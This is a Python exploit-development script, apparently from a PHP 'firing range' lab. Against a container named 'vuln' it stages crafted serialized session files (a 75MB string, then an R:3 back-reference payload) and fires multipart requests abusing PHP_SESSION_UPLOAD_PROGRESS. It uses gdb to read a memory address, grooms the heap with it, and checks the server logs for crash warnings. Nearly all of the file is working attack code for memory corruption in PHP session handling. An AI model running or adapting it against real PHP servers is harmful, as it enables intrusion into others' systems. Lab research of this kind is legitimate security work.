#!/usr/bin/env python3
"""One-shot debug-server experiment on :8081 (in-container):
launch (setsid keepalive loop) -> producer(75MB, world-readable session)
-> BG via atomic gdb -> groom consumer (3MB session) -> warnings + readback."""
import subprocess
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_oracle as o
import dbgbg

CT = q.CT["vuln"]


def sh(cmd, timeout=30):
    r = subprocess.run(["docker", "exec", CT, "sh", "-c", cmd],
                       capture_output=True, text=True, timeout=timeout)
    return r.stdout, r.stderr


def launch_debug():
    sh("rm -f /tmp/dbg-srv.log; pkill -f '127.0.0.1:8081' 2>/dev/null; true")
    time.sleep(0.7)
    subprocess.run(["docker", "exec", CT, "sh", "-c",
                    "setsid sh -c 'while true; do php -S 127.0.0.1:8081 "
                    "-d display_errors=Off -d error_reporting=E_ALL -d log_errors=1 "
                    "-d memory_limit=128M -t /var/www/html >> /tmp/dbg-srv.log 2>&1; "
                    "sleep 2; done' >/dev/null 2>&1 & echo launched"],
                   check=True, timeout=10)
    time.sleep(2.5)
    out, _ = sh("curl -s -m 5 -X POST -d message=ping http://127.0.0.1:8081/ping.php")
    return out.strip()


def stage_rw(sid, content):
    subprocess.run(["docker", "exec", "-i", CT, "sh", "-c",
                    f"cat > /tmp/sess_{sid} && chmod 666 /tmp/sess_{sid}"],
                   input=content, check=True, timeout=180)


def fire(body, timeout=90):
    open("/tmp/dbg-body.bin", "wb").write(body)
    subprocess.run(["docker", "cp", "/tmp/dbg-body.bin", CT + ":/tmp/dbg-body.bin"],
                   check=True)
    open("/tmp/dbgfire.php", "w").write(
        '<?php\n'
        '$b = file_get_contents("/tmp/dbg-body.bin");\n'
        '$fp = stream_socket_client("tcp://127.0.0.1:8081", $e, $s, 10);\n'
        'if (!$fp) { echo "CONNECT-FAIL"; exit(1); }\n'
        'fwrite($fp, "POST /ping.php HTTP/1.1\\r\\nHost: x\\r\\n'
        'Content-Type: multipart/form-data; boundary=G\\r\\n'
        'Content-Length: ".strlen($b)."\\r\\nConnection: close\\r\\n\\r\\n".$b);\n'
        'stream_set_timeout($fp, 60);\n'
        '$r = "";\n'
        'while (!feof($fp)) { $d = fgets($fp, 4096); if ($d === false) break; $r .= $d; }\n'
        'echo substr($r, 0, strpos($r, "\\r\\n") ?: 40), "\\n";\n')
    subprocess.run(["docker", "cp", "/tmp/dbgfire.php", CT + ":/tmp/dbgfire.php"],
                   check=True)
    rc, out = sh("php /tmp/dbgfire.php", timeout=timeout)
    return out.strip()[:60]


def mp_min_body(sid):
    bnd = b"G"
    return (b"--" + bnd + b'\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid.encode() + b"\r\n"
            + b"--" + bnd + b'\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n'
            + b"--" + bnd + b'\r\nContent-Disposition: form-data; name="f"; filename="a.txt"\r\nContent-Type: text/plain\r\n\r\nx\r\n'
            + b"--" + bnd + b"--\r\n")


def producer_session():
    head = b""
    for i in range(12):
        m = b"MK%02d-%s" % (i, b"S" * (60 * (i + 1)))
        head += b'p%d|s:%d:"%s";' % (i, len(m), m)
    head += b'poc|a:2:{i:0;s:3:"abc";i:1;s:75000000:"'
    return head + b"A" * 75000000 + b'";}'


def main():
    print("launch:", launch_debug())
    sid = f"dz{int(time.time())}"
    stage_rw(sid, producer_session())
    st = fire(mp_min_body(sid))
    print("producer:", st)
    bg = bg_via_gdb()
    print("BG after producer:", bg and (hex(bg[0]), bg[1]))
    if bg and bg[1] == 1 and bg[0]:
        d = bg[0]
        gsid = f"dzc{int(time.time())}"
        stage_rw(gsid, b'k|a:2:{i:0;s:9:"WALKOK1!";i:1;R:3;}' + b"A" * (3 * 1024 * 1024))
        st2 = fire(o.build_body(gsid, d, None))
        print("consumer:", st2)
        out, _ = sh("grep -iE 'warning|fatal|failed|undefined|notice' /tmp/dbg-srv.log | tail -12")
        print("warnings:\n" + out)
        out, _ = sh(f"head -c 300 /tmp/sess_{gsid}")
        print("sess:", out[:250])
    return 0


def bg_via_gdb():
    r, _ = dbgbg.read_bg()
    return r


if __name__ == "__main__":
    main()
